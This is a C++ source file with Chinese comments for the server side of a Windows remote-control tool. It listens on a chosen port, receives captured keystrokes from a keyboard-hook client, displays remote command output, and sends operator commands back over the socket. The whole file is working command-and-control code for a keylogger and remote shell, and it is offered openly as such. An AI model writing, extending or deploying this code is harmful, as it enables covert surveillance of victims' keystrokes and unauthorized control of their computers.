// cmd远控server.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include<iostream>
#include<WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#include<map>
#include<time.h>
#include<thread>
#include"..\..\keyBordHOOK\keyBordHOOK\DATA.h"
using namespace std;

int main()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return 0;
    }

    //1.socket
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);


    //2.bind/listen
    //sockaddr addr;
    sockaddr_in addr;
    int length = sizeof(sockaddr_in);
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
    cout << "请输入开放的端口:";
    int post;
    cin >> post;
    addr.sin_port = htons(post);
    bind(s, (sockaddr*)&addr, length);


    listen(s, 5);

    //3.accept

    while (true)
    {
        sockaddr_in clientaddr = { 0 };
        clientaddr.sin_family = AF_INET;
        int addrlen = sizeof(sockaddr_in);


        SOCKET sclient = accept(s, (sockaddr*)&clientaddr, &addrlen);
        time_t timep;
        time(&timep);
        char tmp[64];
        strftime(tmp, sizeof(tmp), "%Y-%m-%d %H:%M:%S", localtime(&timep));
        cout << tmp << endl;
        cout << "客户端连接成功!" << endl << endl << endl;


        thread recvthread([&]() {


            while (true)
            {
                
                int getdate=0;
                char rbuf[30];
                getdate=recv(sclient, rbuf, sizeof(unsigned int)*2, 0);
                DATA* datapacket = (DATA*)rbuf;
                if (getdate > 0)
                {
                    if (datapacket->type == 2001)
                    {
                        char data[256] = { 0 };
                        recv(sclient, data, datapacket->length, 0);
                        cout << "keyboard数据:" << data << endl << endl;
                    }
                    else if (datapacket->type == 1002)
                    {
                        char data[256] = { 0 };
                        recv(sclient, data, datapacket->length, 0);
                        cout << "cmd数据:" << data << endl << endl;

                    }
                }


                else if (getdate < 0)
                {
                    cout << endl << "客户端已经断开连接" << endl << endl;
                    break;
                }


            }
            });






        while (true)
        {
            char wbuf[256] = { 0 };
            gets_s(wbuf);
            int getdate = send(sclient, wbuf, sizeof(wbuf), 0);

            if (getdate <= 0) cout << "send error!!!" << endl;

        }
        //5.closesocket
        closesocket(sclient);
    }







    WSACleanup();

    return 0;
}
